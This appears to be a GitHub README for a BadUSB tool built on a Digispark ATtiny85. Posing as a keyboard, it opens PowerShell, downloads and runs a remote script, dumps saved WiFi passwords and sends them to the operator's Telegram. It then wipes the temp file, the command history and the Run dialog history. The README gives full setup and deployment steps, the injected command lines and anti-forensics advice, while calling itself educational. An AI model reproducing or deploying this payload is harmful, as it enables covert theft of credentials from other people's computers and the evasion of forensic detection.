<!-- 
  META DESCRIPTION: DigiStrike — Digispark ATtiny85 BadUSB cybersecurity demonstration tool
  that silently dumps saved WiFi credentials via HID keyboard injection and exfiltrates them
  to Telegram in under 25 seconds. Built for college exhibitions and security awareness.
  Keywords: BadUSB, Digispark, ATtiny85, HID attack, WiFi credential dumper, cybersecurity,
  penetration testing, red team, Arduino, PowerShell payload, keyboard injection, USB attack.
-->

<div align="center">

# DigiStrike

### *BadUSB WiFi Credential Exfiltrator - Digispark (ATtiny85)*

[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Esther7171/-DigiStrike)
[![Language](https://img.shields.io/badge/Language-Arduino%20%7C%20PowerShell-00979D?style=for-the-badge&logo=arduino&logoColor=white)](https://github.com/Esther7171/-DigiStrike)
[![License](https://img.shields.io/badge/License-BSD%203--Clause-blue?style=for-the-badge)](LICENSE)
[![Category](https://img.shields.io/badge/Category-BadUSB%20%7C%20Red%20Team-red?style=for-the-badge&logo=hackthebox&logoColor=white)](https://github.com/Esther7171/-DigiStrike)
[![Cost](https://img.shields.io/badge/Hardware%20Cost-%3C%20₹300%20(~%243)-brightgreen?style=for-the-badge)](https://github.com/Esther7171/-DigiStrike)
[![Execution](https://img.shields.io/badge/Execution%20Time-~24.3s-orange?style=for-the-badge)](https://github.com/Esther7171/-DigiStrike)

> **Plug in. Register as keyboard. Dump credentials. Exfiltrate. Vanish - in under 25 seconds.**

*A Digispark ATtiny85 based BadUSB cybersecurity demonstration tool built for college exhibitions and security awareness education.*

```
  ██████╗ ██╗ ██████╗ ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
  ██╔══██╗██║██╔════╝ ██║██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
  ██║  ██║██║██║  ███╗██║███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
  ██║  ██║██║██║   ██║██║╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
  ██████╔╝██║╚██████╔╝██║███████║   ██║   ██║  ██║██║██║  ██╗███████╗
  ╚═════╝ ╚═╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
```

</div>

---

## 📋 Table of Contents

- [What is Digispark / ATtiny85?](#-what-is-digispark--attiny85)
- [What DigiStrike Does](#-what-digistrike-does)
- [Execution Timeline](#%EF%B8%8F-execution-timeline)
- [Why Digispark?](#-why-digispark)
- [Zero Trace Design](#%EF%B8%8F-zero-trace-design)
- [How It Works](#-how-it-works)
- [Setup Guide](#%EF%B8%8F-setup-guide)
- [File Structure](#-file-structure)
- [Disclaimer](#%EF%B8%8F-disclaimer)
- [License](#-license)
- [Author](#-author)

---

## 🔌 What is Digispark / ATtiny85?

The **Digispark** is a microcontroller development board powered by the **Atmel ATtiny85** chip — one of the most widely used platforms in hardware security research and red team engagements worldwide.

| Property | Detail |
|----------|--------|
| 🎭 **Disguise** | Registers as an HID keyboard device — the OS never sees USB storage |
| 🛡️ **AV Bypass** | No antivirus triggers, no USB device logs, no driver prompts |
| 💰 **Cost** | Under ₹300 (~$3 USD) — the cheapest HID attack platform available |
| 📐 **Size** | Smaller than a human thumb |
| 🔧 **Customizable** | Programmable with any keyboard payload via Arduino IDE |
| 🌍 **Real-World Use** | Deployed in real-world penetration testing engagements |
| 🏴 **CTF / Red Team** | Staple tool in Capture The Flag competitions and red team exercises |

Because it presents itself as a **Human Interface Device (HID)**, the host OS trusts it unconditionally — no drivers needed, no admin prompts, no antivirus interference. The machine simply sees someone typing very fast.

---

## 💀 What DigiStrike Does

DigiStrike is a fully automated **BadUSB payload** that executes a complete WiFi credential exfiltration attack the moment it is plugged into a Windows machine.

```
Step 01  ──►  Plugged into target PC
Step 02  ──►  OS registers it as a trusted HID keyboard
Step 03  ──►  Opens PowerShell silently via Win+R
Step 04  ──►  Injects bot token and chat ID as environment variables
Step 05  ──►  Pulls void.ps1 payload from GitHub via iex + iwr
Step 06  ──►  Dumps all saved WiFi network credentials (netsh wlan)
Step 07  ──►  Sends credentials file to attacker's Telegram instantly
Step 08  ──►  Deletes temporary file with randomized name
Step 09  ──►  Clears PowerShell command history (session + readline)
Step 10  ──►  Wipes Win+R run dialog MRU registry key
Step 11  ──►  Exits PowerShell
Step 12  ──►  Zero traces left on the system
```

No user interaction. No installation. No UAC prompt. No antivirus alert.

---

## ⏱️ Execution Timeline

Every millisecond of the attack is deterministic and hardcoded into the chip at flash time. Below is the complete timing breakdown from plug-in to clean exit:

| # | Phase | Action | Time |
|---|-------|--------|------|
| 1 | **HID Stabilize** | Initial delay — lets Windows enumerate the device | `3.0s` |
| 2 | **Win+R Launch** | Sends `Win+R` keystroke to open Run dialog | `1.0s` |
| 3 | **PowerShell Open** | Types `powershell -ep bypass`, sends Enter, waits | `4.0s` |
| 4 | **Token Injection** | Types `$env:TK` bot token as env variable | `0.4s` |
| 5 | **Chat ID Injection** | Types `$env:CI` chat ID as env variable | `0.4s` |
| 6 | **Payload Execution** | `iex(iwr ...)` — downloads `void.ps1`, runs it, exfiltrates | `15.0s` |
| 7 | **Clean Exit** | Types `exit`, PowerShell closes | `0.5s` |
| | | **Total — plug to done** | **`~24.3s`** |

> The entire attack completes in **under 25 seconds** — faster than most people notice a device was plugged in.

---

## 🔥 Why Digispark?

When compared to other HID attack platforms, the Digispark stands alone in the budget and accessibility category:

| Feature | Digispark ATtiny85 | USB Rubber Ducky | USB Ninja |
|---------|:-----------------:|:---------------:|:---------:|
| 💰 **Price** | **< ₹300 (~$3)** | ~$80 USD | ~$100 USD |
| 📐 **Size** | Thumb-sized | Small | Small |
| 🎭 **Detected as** | HID Keyboard | HID Keyboard | HID Keyboard |
| 🔧 **Custom Payloads** | ✅ Arduino C | ✅ DuckyScript | ⚠️ Limited |
| 🖥️ **Drivers Required** | ❌ None | ❌ None | ❌ None |
| 🌐 **OS Support** | Win / Linux / Mac | Win / Linux / Mac | Windows |
| 🔌 **Plug and Play** | ✅ Yes | ✅ Yes | ✅ Yes |
| 🏫 **Beginner Friendly** | ✅ Arduino IDE | ⚠️ Proprietary IDE | ❌ Complex |

**The Digispark delivers 95% of the capability at 1% of the cost.**

---

## 🕵️ Zero Trace Design

DigiStrike was engineered with operational security as a first-class concern. Every artifact of execution is systematically identified and destroyed before the device is unplugged.

| Trace Vector | Mitigation Technique |
|-------------|---------------------|
| 📄 **Temp File Name** | Generated with `Get-Random` — unique every single run |
| 🗑️ **Temp File on Disk** | `Remove-Item -Force` immediately after exfiltration |
| 📜 **PowerShell Session History** | `Clear-History` clears in-memory history |
| 📜 **PSReadLine History** | `[PSConsoleReadLine]::ClearHistory()` clears persistent readline buffer |
| 🗝️ **Win+R MRU Registry** | `RunMRU` key wiped via `Remove-ItemProperty` |
| 🔌 **USB Device Logs** | HID class generates no USB mass storage event logs |
| 🤫 **Secrets in Firmware** | Token and chat ID are typed live as env vars — never stored in script |
| ☁️ **GitHub Script Security** | `void.ps1` contains zero credentials — safe to host publicly |

After the device is removed, **forensic analysis finds nothing actionable** on the target machine.

---

## 🔄 How It Works

```
╔═════════════════════════════════════════════════════════════════════╗
║                    DIGISTRIKE — ATTACK FLOW                        ║
╚═════════════════════════════════════════════════════════════════════╝

   ┌───────────┐       ┌──────────────────┐       ┌─────────────────┐
   │  PLUG IN  │──────►│  HID DETECTED    │──────►│  PS OPENS       │
   │           │       │  (OS trusts it   │       │  SILENTLY       │
   │  t = 0s   │       │   as keyboard)   │       │  via Win+R      │
   └───────────┘       └──────────────────┘       └────────┬────────┘
                                                            │
                    ┌───────────────────────────────────────┘
                    ▼
       ┌────────────────────┐       ┌───────────────────────┐
       │  ENV VARS INJECTED │──────►│   GITHUB PULL         │
       │  $env:TK  (token)  │       │   iex(iwr void.ps1)   │
       │  $env:CI  (chatid) │       │   downloaded live     │
       └────────────────────┘       └──────────┬────────────┘
                                               │
                    ┌──────────────────────────┘
                    ▼
       ┌────────────────────┐       ┌───────────────────────┐
       │  WIFI CREDS DUMPED │──────►│  SENT TO TELEGRAM     │
       │  netsh wlan        │       │  curl.exe POST        │
       │  → random tmp file │       │  document upload      │
       └────────────────────┘       └──────────┬────────────┘
                                               │
                    ┌──────────────────────────┘
                    ▼
       ┌────────────────────┐       ┌───────────────────────┐
       │  TRACES DESTROYED  │──────►│        DONE ✓         │
       │  • temp file       │       │                       │
       │  • PS history      │       │    Total: ~24.3s      │
       │  • registry MRU    │       │    Zero artifacts     │
       └────────────────────┘       └───────────────────────┘

   [Digispark] ──HID──► [Windows] ──Win+R──► [PowerShell] ──iex──► [GitHub]
                                                   │
                                            [netsh wlan] ──► [Temp File] ──► [Telegram 📱]
```

---

## 🛠️ Setup Guide

### Prerequisites

- Arduino IDE **1.8.x** (recommended — 2.x has known Digispark upload timing issues)
- A Digispark ATtiny85 board (< ₹300 on Amazon/AliExpress)
- A Telegram account for receiving exfiltrated data

---

### Step 1 — Arduino IDE & Board Manager

**1.1** Open Arduino IDE → `File` → `Preferences`

**1.2** Paste this URL in the *Additional Board Manager URLs* field:
```
http://digistump.com/package_digistump_index.json
```

**1.3** Go to `Tools` → `Board` → `Board Manager`, search **Digistump AVR Boards**, click **Install**.

**1.4** Select your target board:
```
Tools → Board → Digistump AVR Boards → Digispark (Default - 16.5mhz)
```

> ⚠️ Do **not** select a COM port — Digispark handles this during upload automatically.

---

### Step 2 — DigiKeyboard Library

The `DigiKeyboard.h` library ships bundled with the Digistump board package — no separate installation needed.

If it is missing from your installation:
```
Sketch → Include Library → Manage Libraries → search "DigiKeyboard" → Install
```

---

### Step 3 — Configure the Payload

Open [digispark/r00t_b0t.ino](digispark/r00t_b0t.ino) and fill in your credentials:

```cpp
DigiKeyboard.print("$env:TK='Your bot token here'");   // ← your Telegram bot token
DigiKeyboard.print("$env:CI='-100xxxxxxxxxx'");         // ← your Telegram chat ID
```

> 🔒 These values are typed as live keystrokes into PowerShell — they never touch disk, the script, or GitHub.

---

### Step 4 — Flash the Digispark

**4.1** Click **Upload** (`Ctrl+U`) in Arduino IDE. You will see:
```
Running Digispark Uploader...
Plug in device now... (will timeout in 60 seconds)
```

**4.2** **Do NOT plug in the Digispark before clicking Upload.** Wait for the above prompt, then plug it in.

**4.3** Wait for the success confirmation:
```
>> Micronucleus done. Thank you!
```

Your DigiStrike is now flashed and ready to deploy.

---

### Step 5 — Telegram Bot Setup

**5.1** Open Telegram → search `@BotFather` → send `/newbot` → follow the prompts.

**5.2** Copy the **API token** provided:
```
123456789:ABCDefghIJKlmnoPQRstUVwxyz_yourtokenhere
```

**5.3** Get your **Chat ID** — send any message to your bot, then visit:
```
https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates
```
Find `"chat":{"id": -100XXXXXXXXXX}` in the JSON response.

**5.4** Paste both values into [digispark/r00t_b0t.ino](digispark/r00t_b0t.ino) as shown in Step 3, then reflash.

---

### Step 6 — Deploy

Plug the flashed Digispark into any Windows machine with saved WiFi networks. In approximately **24.3 seconds**, a `.txt` document containing all saved WiFi SSIDs and plaintext passwords will arrive in your Telegram — labelled with the target's computer name and username.

---

## 📁 File Structure

```
-DigiStrike/
├── README.md                  ← You are here
├── LICENSE                    ← BSD 3-Clause
├── digispark/
│   └── r00t_b0t.ino           ← ATtiny85 Arduino sketch — the HID payload
└── scripts/
    └── void.ps1               ← PowerShell exfiltration script (hosted on GitHub)
```

### Key Files at a Glance

| File | Role |
|------|------|
| [`digispark/r00t_b0t.ino`](digispark/r00t_b0t.ino) | Flashed to ATtiny85 — drives all keystrokes, opens PS, fires the payload |
| [`scripts/void.ps1`](scripts/void.ps1) | Fetched at runtime — dumps WiFi creds, exfiltrates via Telegram, cleans all traces |

---

## ⚠️ Disclaimer

> **This project exists strictly for educational purposes and authorized security research.**

- ✅ Use on **your own devices** or with **explicit written permission** from the device owner
- ✅ Demonstrate at **college exhibitions**, **CTF labs**, and **cybersecurity awareness workshops**
- ✅ Use to **study attack vectors** and build stronger defenses
- ❌ **Do NOT use on any device you do not own or have authorization to test**
- ❌ **Unauthorized use violates the IT Act (India), CFAA (USA), Computer Misuse Act (UK), and equivalent laws worldwide**

The author assumes **zero liability** for any misuse, damage, legal action, or consequences arising from the use of this tool. **You are solely and entirely responsible for your actions.**

---

## 📄 License

```
BSD 3-Clause License
Copyright (c) 2026, Esther7171 (deathesther)
```

See [LICENSE](LICENSE) for the full license text.

---

## 👤 Author

<div align="center">

**Esther7171**

[![GitHub Profile](https://img.shields.io/badge/GitHub-Esther7171-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esther7171)
[![DeathEsther Project](https://img.shields.io/badge/Also%20See-DeathEsther-8B0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esther7171/DeathEsther)

*Building security tools for awareness, education, and the endlessly curious.*

</div>

---

<div align="center">

**If this helped you understand how BadUSB attacks work — drop a ⭐**

*Made with ⚡ and too much curiosity*

</div>
